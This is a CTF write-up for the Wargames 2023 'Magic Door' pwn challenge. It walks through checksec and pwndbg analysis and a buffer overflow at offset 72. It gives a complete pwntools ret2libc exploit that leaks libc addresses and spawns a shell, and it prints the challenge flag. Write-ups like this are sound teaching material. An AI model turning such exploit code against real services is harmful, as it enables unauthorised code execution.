---
title: Magic Door
author: capang
date: 2024-01-02 09:30:00 +0800
categories: [Writeups, PWN]
tags: [wargames 2023]
math: true
mermaid: true
---

# Source File

[Download Source File]({{site.baseurl}}/assets/files/magic-door.zip)

# Analysis

file type check

```bash
$file magic_door 
magic_door: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=b2c5b2c9198914b2cf836a01366419a6a56adee1, for GNU/Linux 3.2.0, not stripped
```

file protection check

```bash
checksec --file magic_door 
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

- No stack canary -> can buffer overflow
- No PIE -> address leaking much easier

try to run

```bash
$ ./magic_door 
Welcome to the Magic Door !
Which door would you like to open? 11111
Oops. No magic door for you.
```

time to disassemble it in ghidra

1st challenge 

We need to bypass input validation != "50015" but need string with integer value of 50015

- Solution: +50015 or "050015"

2nd Challenge

- magic_door function accepts insane amount of chars, time to try overflow it

```bash
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> 
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> Quit
pwndbg> run
Starting program: /home/gnapac/Desktop/CTF/wgmy23/challenge/magic_door 
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
Welcome to the Magic Door !
Which door would you like to open? +50015
Congratulations! You opened the magic door!
Where would you like to go? 
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401388 in magic_door ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]────────────────────────────────────
*RAX  0x7fffffffe310 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
*RBX  0x7fffffffe4a8 —▸ 0x7fffffffe6f1 ◂— '/home/gnapac/Desktop/CTF/wgmy23/challenge/magic_door'
*RCX  0x7fffffffe310 ◂— 'aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa\n'
*RDX  0x65
*RDI  0x7ffff7f9da40 (_IO_stdfile_0_lock) ◂— 0x0
*RSI  0x7ffff7f9bb23 (_IO_2_1_stdin_+131) ◂— 0xf9da40000000000a /* '\n' */
*R8   0x1
 R9   0x0
*R10  0x7ffff7dd10b8 ◂— 0x100022000048a8
*R11  0x246
 R12  0x0
*R13  0x7fffffffe4b8 —▸ 0x7fffffffe726 ◂— 'SHELL=/bin/bash'
*R14  0x403e18 (__do_global_dtors_aux_fini_array_entry) —▸ 0x401240 (__do_global_dtors_aux) ◂— endbr64 
*R15  0x7ffff7ffd000 (_rtld_global) —▸ 0x7ffff7ffe2d0 ◂— 0x0
*RBP  0x6161616161616169 ('iaaaaaaa')
*RSP  0x7fffffffe358 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa\n'
*RIP  0x401388 (magic_door+135) ◂— ret 
─────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]─────────────────────────────────────────────
 ► 0x401388 <magic_door+135>    ret    <0x616161616161616a>










──────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────
00:0000│ rsp 0x7fffffffe358 ◂— 'jaaaaaaakaaaaaaalaaaaaaamaaa\n'
01:0008│     0x7fffffffe360 ◂— 'kaaaaaaalaaaaaaamaaa\n'
02:0010│     0x7fffffffe368 ◂— 'laaaaaaamaaa\n'
03:0018│     0x7fffffffe370 ◂— 0xa6161616d /* 'maaa\n' */
04:0020│     0x7fffffffe378 —▸ 0x401470 (main+29) ◂— mov eax, 0
05:0028│     0x7fffffffe380 —▸ 0x7fffffffe4a8 —▸ 0x7fffffffe6f1 ◂— '/home/gnapac/Desktop/CTF/wgmy23/challenge/magic_door'
06:0030│     0x7fffffffe388 ◂— 0x100000000
07:0038│     0x7fffffffe390 ◂— 0x1
────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────
 ► 0         0x401388 magic_door+135
   1 0x616161616161616a
   2 0x616161616161616b
   3 0x616161616161616c
   4      0xa6161616d
   5         0x401470 main+29
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
pwndbg>
```
- we populate RSP with jaaaaaaakaaaaaaalaaaaaaamaaa

```
jaaaaaaakaaaaaaalaaaaaaamaaa
Found at offset 72
```
- offset = 72
- it needs 72 Characters for us to ovewrite the return address
- next we can execute ret2libc attack

```python
from pwn import *


# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './magic_door'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
libc = elf.libc
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

# Start program
io = start()

# useful gadgets
ret = p64(0x000000000040101a)
pop_rdi = p64(0x0000000000401434)

# main = p64(0x0000000000401453)

# got of libc functions
plt_puts = p64(elf.plt.puts)
got_puts = p64(elf.got.puts)
got_printf = p64(elf.got.printf)

# magic door input

payload = b"+50015"

# crafting payload for leaking libs functions

padding = 72
secondPayload = b'A'*padding
secondPayload += pop_rdi + got_puts + plt_puts
secondPayload += pop_rdi + got_printf + plt_puts
# go back to the function for final execution
secondPayload += p64(elf.symbols.magic_door) 

#sending payload
print("elf.symbols.magic_door : ",elf.symbols.magic_door)
io.recvuntil(b'open?')
io.sendline(payload)
io.recvuntil(b'Where would you like to go?')
io.sendline(secondPayload)
io.recv()

# recv leaked address
output = io.recv().split(b'\n')
print("output : ", output)
leak_puts = u64(output[0].ljust(8,b"\x00"))
leak_printf = u64(output[1].ljust(8,b"\x00"))
print("puts {}".format(str(hex(leak_puts))))
print("printf {}".format(str(hex(leak_printf))))

# final payload
thirdPayload = b'A'*padding
thirdPayload += pop_rdi + p64(leak_printf + 0x177fa8)
thirdPayload += p64(leak_printf - 0xf980)

io.sendline(thirdPayload)
io.interactive()

'''
binsh:  0x19604f

    system  0x050d70    -0xf980
    puts    0x080e50    0x20760

wgmy{4a029bf40a28039c8492acfa866f8d96}

'''

```
{: file='exploit.py'}

wgmy{4a029bf40a28039c8492acfa866f8d96}